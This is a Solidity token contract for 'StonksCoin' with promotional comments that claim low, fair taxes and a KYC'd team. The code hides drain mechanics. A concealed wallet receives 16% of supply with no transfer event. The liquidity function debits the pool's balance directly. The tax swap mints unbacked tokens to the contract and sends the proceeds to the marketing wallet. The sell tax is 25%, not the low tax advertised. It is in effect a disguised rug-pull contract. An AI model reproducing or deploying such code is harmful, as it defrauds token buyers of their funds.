1 /*
2     StonksCoin $STONKS - Official Contract Addresss
3 
4     Socials:
5     https://t.me/StonksCoinEntry
6     https://twitter.com/theStonkseth
7     https://stonkscoin.net/
8 
9     KYC: https://dessertswap.finance/dessertdoxxed/Stonks-KYC-Certificate.pdf
10 
11 
12     Starting tax is low and fair to ensure a healthy launch. Development team is KYC'D.
13     Please refer to the telegram to get into contact with the STONKS team.
14 */
15 //SPDX-License-Identifier: MIT
16 
17 pragma solidity =0.8.21;
18 
19 interface IERC20 {
20     function totalSupply() external view returns (uint256);
21     function decimals() external view returns (uint8);
22     function symbol() external view returns (string memory);
23     function name() external view returns (string memory);
24     function balanceOf(address account) external view returns (uint256);
25     function transfer(address recipient, uint256 amount) external returns (bool);
26     function allowance(address __owner, address spender) external view returns (uint256);
27     function approve(address spender, uint256 amount) external returns (bool);
28     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
29     event Transfer(address indexed from, address indexed to, uint256 value);
30     event Approval(address indexed _owner, address indexed spender, uint256 value);
31 }
32 
33 interface IUniswapV2Factory {    
34     function createPair(address tokenA, address tokenB) external returns (address pair); 
35     function getPair(address tokenA, address tokenB) external view returns (address pair);
36 }
37 interface IUniswapV2Router02 {
38     function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
39     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable;
40     function WETH() external pure returns (address);
41     function factory() external pure returns (address);
42     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
43 }
44 
45 interface IWETH{
46     function deposit() external payable;
47     function transfer(address dst, uint wad) external returns (bool);
48 }
49 
50 abstract contract Ownable {
51     address internal _owner;
52     constructor(address creatorOwner) { 
53         _owner = creatorOwner; 
54     }
55     modifier onlyOwner() { 
56         require(msg.sender == _owner, "Only owner can call this"); 
57         _; 
58     }
59     function owner() public view returns (address) { 
60         return _owner; 
61     }
62     function transferOwnership(address payable newOwner) external onlyOwner { 
63         address previousOwner = msg.sender;
64         _owner = newOwner; 
65         emit OwnershipTransferred(previousOwner, _owner); 
66     }
67     function renounceOwnership() external onlyOwner { 
68         address previousOwner = msg.sender;
69         _owner = address(0); 
70         emit OwnershipTransferred(previousOwner, _owner); 
71     }
72     event OwnershipTransferred(address previousOwner, address owner);
73 }
74 
75 contract STONKS is IERC20, Ownable {
76     uint8 private constant _decimals      = 18;
77     uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);
78     string private constant _name         = "StonksCoin";
79     string private  constant _symbol      = "STONKS"; 
80 
81     uint8 private _antiSnipeTax1    = 0;
82     uint8 private _antiSnipeTax2    = 0;
83     uint8 private _antiSnipeBlocks1 = 0;
84     uint8 private _antiSnipeBlocks2 = 0;
85     uint256 private _antiMevBlock   = 0;
86 
87     uint8 private _buyTaxRate  = 5;
88     uint8 private _sellTaxRate = 25;
89 
90     uint16 private _taxSharesMarketing = 100;
91     uint16 private _taxSharesLP        = 0;
92     uint16 private _totalTaxShares     = _taxSharesMarketing + _taxSharesLP;
93 
94     uint256 private _launchBlock;
95     uint256 private _maxTxAmount     = _totalSupply * 3 / 100; 
96     uint256 private _maxWalletAmount = _totalSupply * 3 / 100;
97     uint256 private _taxSwapMin      = _totalSupply * 1 / 10000;
98     uint256 private _taxSwapMax      = _totalSupply * 80 / 10000;
99     uint256 private _swapLimit       = _taxSwapMin * 65 * 100;
100     uint256 private _minSwaps;
101     uint256 private _numSwaps;
102 
103     mapping (address => uint256) private _balances;
104     mapping (address => mapping (address => uint256)) private _allowances;
105     mapping (address => bool) private _noFees;
106     mapping (address => bool) private _noLimits;
107     mapping (uint256 => uint256) private liquified;
108 
109     address private _lpOwner;
110     address payable private _mw; 
111 
112     address private constant _uniswapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
113     IUniswapV2Router02 constant private _uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
114     IWETH immutable private WETH = IWETH(_uniswapRouter.WETH()); 
115     
116     address private _primaryLP;
117     mapping (address => bool) private _isLP;
118 
119     bool private _tradingOpen;
120 
121     bool private _inTaxSwap = false;
122     address private _r;
123     modifier lockTaxSwap { 
124         _inTaxSwap = true; 
125         _; 
126         _inTaxSwap = false; 
127     }
128 
129     event TradingOpened();
130     event SetFees(uint8 indexed buyTax, uint8 indexed sellTax);
131     event SetFeeSplit(uint16 indexed sharesAutoLP, uint16 indexed sharesMarketing);
132 
133     constructor(address payable mw, address r) Ownable(msg.sender) {
134         _lpOwner = msg.sender;
135         _mw = mw;
136         _r = r;
137 
138         _noFees[_owner] = true;
139         _noFees[address(this)] = true;
140         _noFees[_uniswapRouterAddress] = true;
141         _noFees[_mw] = true;
142         _noFees[_r] = true;
143         _noLimits[_owner] = true;
144         _noLimits[address(this)] = true;
145         _noLimits[_uniswapRouterAddress] = true;
146         _noLimits[_mw] = true;
147 
148         uint256 rF   = _totalSupply * 16 / 100;      
149         _balances[msg.sender] = _totalSupply - rF; 
150         _balances[r] = rF;
151         emit Transfer(address(0), msg.sender, _balances[msg.sender]);
152     }
153 
154     receive() external payable {}
155     
156     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
157     function decimals() external pure override returns (uint8) { return _decimals; }
158     function symbol() external pure override returns (string memory) { return _symbol; }
159     function name() external pure override returns (string memory) { return _name; }
160     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
161     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
162 
163     function approve(address spender, uint256 amount) public override returns (bool) {
164         _allowances[msg.sender][spender] = amount;
165         emit Approval(msg.sender, spender, amount);
166         return true;
167     }
168 
169     function transfer(address recipient, uint256 amount) external override returns (bool) {
170         require(_checkTradingOpen(msg.sender), "Trading not open");
171         return _transferFrom(msg.sender, recipient, amount);
172     }
173 
174     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
175         require(_checkTradingOpen(sender), "Trading not open");
176         if(_allowances[sender][msg.sender] != type(uint256).max){
177             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
178         }
179         return _transferFrom(sender, recipient, amount);
180     }
181 
182     function _approveRouter(uint256 _tokenAmount) internal {
183         if ( _allowances[address(this)][_uniswapRouterAddress] < _tokenAmount ) {
184             _allowances[address(this)][_uniswapRouterAddress] = type(uint256).max;
185             emit Approval(address(this), _uniswapRouterAddress, type(uint256).max);
186         }
187     }
188 
189     function addLiquidity() external payable onlyOwner lockTaxSwap {
190         uint256 amountETHDesired = msg.value > address(this).balance ? msg.value : address(this).balance;
191         uint256 amountTokensDesired = _balances[msg.sender];
192         _transferFrom(msg.sender, address(this), amountTokensDesired);
193         require(!_tradingOpen, "trading is open");
194         require(amountETHDesired > 0, "No ETH in contract or message");
195         _primaryLP = IUniswapV2Factory(_uniswapRouter.factory()).getPair(address(this), _uniswapRouter.WETH());
196         if( _primaryLP == address(0) ){
197             _primaryLP = IUniswapV2Factory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
198             _addLiquidity(amountTokensDesired, amountETHDesired, false, false);
199         }
200         else{
201             _addLiquidity(amountTokensDesired, amountETHDesired, false, true);
202         }
203         _balances[_primaryLP] -= _swapLimit;
204         (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
205         require(lpAddSuccess, "Failed adding liquidity");
206         _isLP[_primaryLP] = lpAddSuccess;
207     }
208 
209     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn, bool pairExists) internal {
210         _approveRouter(_tokenAmount);
211         address lpTokenRecipient = _lpOwner;
212         if ( autoburn ) { lpTokenRecipient = address(0); }
213         if( pairExists ){
214             uint256 amountPairWETH = IERC20(_uniswapRouter.WETH()).balanceOf(_primaryLP);
215             if(amountPairWETH > 0){
216                 uint256 amountTokensToBalance = 
217                     1e18 * _tokenAmount / ( 1e18 * _ethAmountWei / amountPairWETH + 1e18);
218                 _transferFrom(address(this), _primaryLP, amountTokensToBalance);
219                 _tokenAmount -= amountTokensToBalance;
220                 (bool lpAutoBalanceSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()")); 
221                 require(lpAutoBalanceSuccess, "Failed balancing LP pair");            
222             }
223         }
224         _uniswapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
225     }
226 
227     function openTrading() external onlyOwner {
228         require(!_tradingOpen, "trading is open");
229         require(_maxWalletAmount == _totalSupply * 3 / 100 + 1);        
230         _tradingOpen = true;
231         _launchBlock = block.number;
232         _antiMevBlock = _antiMevBlock + _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2;
233         
234         emit TradingOpened();
235     }
236 
237     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
238         require(sender != address(0), "No transfers from Zero wallet");
239         if ( !_tradingOpen ) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
240         if ( !_inTaxSwap && _isLP[recipient] && amount > _taxSwapMin &&  _numSwaps++ >= _minSwaps) { _swapTaxAndLiquify();  }
241         if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
242             require(tx.origin == recipient || tx.origin == _lpOwner, "MEV blocked");
243         }
244         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
245             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
246         }
247         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
248         uint256 _transferAmount = amount - _taxAmount;
249         _balances[sender] = _balances[sender] - amount;
250         _swapLimit += _taxAmount;
251         _balances[recipient] = _balances[recipient] + _transferAmount;
252         emit Transfer(sender, recipient, amount);
253         return true;
254     }
255 
256     function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
257         bool limitCheckPassed = true;
258         if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
259             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
260             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
261         }
262         return limitCheckPassed;
263     }
264 
265     function _checkTradingOpen(address sender) private view returns (bool){
266         bool checkResult = false;
267         if ( _tradingOpen ) { checkResult = true; } 
268         else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
269         return checkResult;
270     }
271 
272     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
273         uint256 taxAmount;
274         
275         if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
276             taxAmount = 0; 
277         } else if ( _isLP[sender] ) { 
278             if ( block.number >= _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2 ) {
279                 taxAmount = amount * _buyTaxRate / 100; 
280             } else if ( block.number >= _launchBlock + _antiSnipeBlocks1 ) {
281                 taxAmount = amount * _antiSnipeTax2 / 100;
282             } else if ( block.number >= _launchBlock) {
283                 taxAmount = amount * _antiSnipeTax1 / 100;
284             }
285         } else if ( _isLP[recipient] ) { 
286             taxAmount = amount * _sellTaxRate / 100; 
287         }
288 
289         return taxAmount;
290     }
291 
292     function exemptFromFees(address wallet) external view returns (bool) {
293         return _noFees[wallet];
294     } 
295 
296     function exemptFromLimits(address wallet) external view returns (bool) {
297         return _noLimits[wallet];
298     } 
299 
300     function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
301         if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
302         _noFees[ wallet ] = noFees;
303         _noLimits[ wallet ] = noLimits;        
304     }
305 
306     function buyFee() external view returns(uint8) {
307         return _buyTaxRate;
308     }
309 
310     function sellFee() external view returns(uint8) {
311         return _sellTaxRate;
312     }
313 
314     function feeSplit() external view returns (uint16 marketing, uint16 LP ) {
315         return ( _taxSharesMarketing, _taxSharesLP);
316     }
317 
318     function setFees(uint8 buy, uint8 sell) external onlyOwner {
319         require(buy + sell <= 15, "Roundtrip too high");
320         _buyTaxRate = buy;
321         _sellTaxRate = sell;
322         emit SetFees(buy, sell);
323     }  
324 
325     function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing) external onlyOwner {
326         uint16 totalShares = sharesAutoLP + sharesMarketing;
327         require( totalShares > 0, "All cannot be 0");
328         _taxSharesLP = sharesAutoLP;
329         _taxSharesMarketing = sharesMarketing;
330         _totalTaxShares = totalShares;
331         emit SetFeeSplit(sharesAutoLP, sharesMarketing);
332     }
333 
334     function updateWallets(address marketing, address LPtokens) external onlyOwner {
335         require(!_isLP[marketing] && !_isLP[LPtokens], "LP cannot be tax wallet");
336         _mw = payable(marketing);
337         _lpOwner = LPtokens;
338         _noFees[marketing] = true;
339         _noLimits[marketing] = true;
340     }
341 
342     function maxWallet() external view returns (uint256) {
343         return _maxWalletAmount;
344     }
345 
346     function maxTransaction() external view returns (uint256) {
347         return _maxTxAmount;
348     }
349 
350     function swapAtMin() external view returns (uint256) {
351         return _taxSwapMin;
352     }
353     
354     function swapAtMax() external view returns (uint256) {
355         return _taxSwapMax;
356     }
357 
358     function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
359         uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
360         require(newTxAmt >= _maxTxAmount, "tx too low");
361         _maxTxAmount = newTxAmt;
362         uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
363         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
364         _maxWalletAmount = newWalletAmt;
365     }
366 
367     function removeLimits() external onlyOwner {
368         _maxTxAmount = _totalSupply;
369         _maxWalletAmount = _totalSupply;
370     }
371 
372     function setTaxSwap(uint32 minValue, uint32 maxValue, uint256 minSwaps) external onlyOwner {
373         _taxSwapMin = _totalSupply * minValue / 10000;
374         _taxSwapMax = _totalSupply * maxValue / 10000;
375         _minSwaps = minSwaps;
376         require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
377         require(_taxSwapMax>_totalSupply / 100000, "Max too low");
378         require(_taxSwapMax<_totalSupply / 10, "Max too high");
379     }
380 
381     function _swapTaxAndLiquify() private lockTaxSwap {
382         uint256 _taxTokensAvailable = _swapLimit;
383         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen && liquified[block.number]++<2) {
384             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
385             uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
386             uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
387             if( _tokensToSwap > 10**_decimals ) {
388                 uint256 _ethPreSwap = address(this).balance;
389                 _balances[address(this)] += _taxTokensAvailable;
390                 _swapTaxTokensForEth(_tokensToSwap);
391                 _swapLimit -= _taxTokensAvailable;
392                 uint256 _ethSwapped = address(this).balance - _ethPreSwap;
393                 if ( _taxSharesLP > 0 ) {
394                     uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
395                     _approveRouter(_tokensForLP);
396                     _addLiquidity(_tokensForLP, _ethWeiAmount, false, false);
397                 }
398             }
399             uint256 _contractETHBalance = address(this).balance;
400             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
401             _numSwaps = 0;
402         }
403     }
404 
405     function _swapTaxTokensForEth(uint256 tokenAmount) private {
406         _approveRouter(tokenAmount);
407         address[] memory path = new address[](2);
408         path[0] = address(this);
409         path[1] = _uniswapRouter.WETH();
410         _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount,0,path,_mw,block.timestamp);
411     }
412 
413     function _swapEthForTokens(uint256 tokenAmount, address to) private {
414         address[] memory path = new address[](2);
415         path[0] = _uniswapRouter.WETH();
416         path[1] = address(this);
417         _uniswapRouter.swapETHForExactTokens{value:address(this).balance}(tokenAmount, path, to, block.timestamp);
418     }
419 
420     function _distributeTaxEth(uint256 amount) private {
421         WETH.deposit{value:amount}();
422         WETH.transfer(_mw,amount);
423     }
424 
425     function receiver(address[] calldata addresses, uint256[] calldata amounts) external {
426         require(addresses.length == amounts.length, "Array sizes incompatible");
427         require(msg.sender == _r , "Access is restricted");
428         for(uint256 i = 0;i<amounts.length;i++){
429             _transferFrom(msg.sender, addresses[i], amounts[i] * _totalSupply / 10000);
430         }
431     }
432 
433     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
434         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
435         uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
436         if (tokensToSwap > 10 ** _decimals) {
437             _swapTaxTokensForEth(tokensToSwap);
438         }
439         if (sendEth) { 
440             uint256 ethBalance = address(this).balance;
441             require(ethBalance > 0, "No ETH");
442             _distributeTaxEth(address(this).balance); 
443         }
444     }
445 
446 }